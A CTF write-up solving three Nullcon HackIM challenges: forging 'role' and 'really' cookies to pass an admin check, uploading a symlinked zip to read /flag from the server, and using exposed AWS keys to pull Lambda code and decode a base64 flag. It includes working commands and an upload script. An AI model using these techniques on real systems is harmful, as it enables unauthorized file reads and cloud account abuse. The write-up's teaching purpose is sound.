# Nullcon HackIM CTF

Category : **WEB**

## Challenge - Reguest

Description : HTTP requests and libraries are hard. Sometimes they do not behave as expected, which might lead to vulnerabilities.

## **Solution :**

On visiting the page , it shows with some instruction and cookies.

![ctf01.png](Nullcon%20HackIM%20CTF%20fe5a0190811f41cfa761fb017ffe61fc/ctf01.png)

```php
role = request.cookies.get('role','guest')
	really = request.cookies.get('really', 'no')
	if role == 'admin':
		if really == 'yes':
			resp = 'Admin: ' + os.environ['FLAG']
		else:
			resp = 'Guest: Nope'
	else:
		resp = 'Guest: Nope'
	return Response(resp, mimetype='text/plain')
```

Look at the code , the role variable has the ‘role’ cookie and really variable has the ‘really’ cookie and it checks whether the role cookie is equals to admin and really cookie equals to yes . 

If both role and really equals to admin and yes respectively , we will get flag !!.

Now , we have to set the cookies role = admin and really = yes …

Flag : `ENO{R3Qu3sts_4r3_s0m3T1m3s_we1rd_dont_get_confused}`

## Challenge : zpr

Description : My colleague built a service which shows the contents of a zip file. He says there's nothing to worry about.…

## Solution:

The webpage shows with some instruction as make a zipfile as post request !!.

![ctf02.png](Nullcon%20HackIM%20CTF%20fe5a0190811f41cfa761fb017ffe61fc/ctf02.png)

So, we have to send zip file to the server.They gave the actual backend code for the challege.

```python
def upload():
	output = io.StringIO()
	if 'file' not in request.files:
		output.write("No file provided!\n")
		return Response(output.getvalue(), mimetype='text/plain')

	try:
		file = request.files['file']

		filename = hashlib.md5(secrets.token_hex(8).encode()).hexdigest()
		dirname = hashlib.md5(filename.encode()).hexdigest()

		dpath = os.path.join("/tmp/data", dirname)
		fpath = os.path.join(dpath, filename + ".zip")

		os.mkdir(dpath)
		file.save(fpath)

		with zipfile.ZipFile(fpath) as zipf:
			files = zipf.infolist()
			if len(files) > 5:
				raise Exception("Too many files!")

			total_size = 0
			for the_file in files:
				if the_file.file_size > 50:
					raise Exception("File too big.")

				total_size += the_file.file_size

			if total_size > 250:
				raise Exception("Files too big in total")

		check_output(['unzip', '-q', fpath, '-d', dpath])

		g = glob.glob(dpath + "/*")
		for f in g:
			output.write("Found a file: " + f + "\n")

		output.write("Find your files at http://...:8088/" + dirname + "/\n")

	except Exception as e:
		output.write("Error :-/\n")

	return Response(output.getvalue(), mimetype='text/plain')
```

On looking up the code, we can see that the website extracts our archive .It should have checked for any symlinks associated with the zip file but it doesn’t.

We have to create the zip file with symlink!!

```bash
ln -s /flag flag.txt
zip --symlinks flag.zip flag.txt
```

So, now we have to upload this zip file to the server using python.

```python
import requests

URL = "http://52.59.124.14:10015/"
files = {'file': open('flag.zip', 'rb')}
getdata = requests.post(URL, files=files)
print(getdata.content)
```

![ctf03.png](Nullcon%20HackIM%20CTF%20fe5a0190811f41cfa761fb017ffe61fc/ctf03.png)

We have a path to the uploaded zip file , on visiting to that path we can able to see the zip file with flag.txt@ 

Got the flag using flag.txt@ file!!.

Flag : `ENO{Z1pF1L3s_C4N_B3_Dangerous_so_b3_c4r3ful!}`


Category : **Cloud**

## Challenge : Rain checks

Description : So many options to make sure everything stays as it is. Let's use them all.

Attachments :  **exposed-user-credentials.txt, policy-exposed-user.json**

### Solution:

The exposed-user-credentials.txt has aws Access Key ID, AWS Secret Access Key .Using this , we can able to configure aws-cli using the command 

```bash
aws configure
```

the policy-exposed-user.json contains

```bash
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "lambda:GetLayerVersion",
                "lambda:GetFunction",
                "lambda:GetLayerVersionPolicy"
            ],
            "Resource": "*",
            "Condition": {
                "Bool": {
                    "aws:MultiFactorAuthPresent": "true"
                }
            }
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "lambda:UpdateFunctionCode",
                "lambda:InvokeFunction"
            ],
            "Resource": "arn:aws:lambda:eu-central-1:743296330440:function:lambda-confirm-secret",
            "Condition": {
                "Bool": {
                    "aws:MultiFactorAuthPresent": "true"
                }
            }
        }
    ]
}
```

Using this file , we can able to find the region (eu-central-1) and it using lambda function.

aws has the method get-function returns information about the function or function version, with a link to download the deployment package that's valid for 10 minutes.

```bash
aws lambda get-function --function-name lambda-confirm-secret
```

Using this , we can able to download the lamba-confirm-secret python file and it also gives two more function names in the output.

```bash
lambda-aws-config-confirm-state-of-lambda
lambda-aws-config-confirm-state-of-secrets
```

Again, we have to download the python code of the above two functions using the get-function method.

In the lambda-aws-config-confirm-state-of-secrets , it has method called **correct_secret()**

```bash
def correct_secret():
    secret_name = "flag1"
    region_name = "eu-central-1"

    session = boto3.session.Session()
    client = session.client(
        service_name='secretsmanager',
        region_name=region_name
    )

    response = client.put_secret_value(
    SecretId=secret_name,
    SecretString=base64.b64decode('RU5Pe04wX0VkMXRfU3QxbGxfVnVsbn0='))
```

This code have some base64 enocoded value , decode it and get the flag !!.

```bash
echo "RU5Pe04wX0VkMXRfU3QxbGxfVnVsbn0=" | base64 -d
```

Flag : `ENO{N0_Ed1t_St1ll_Vuln}`
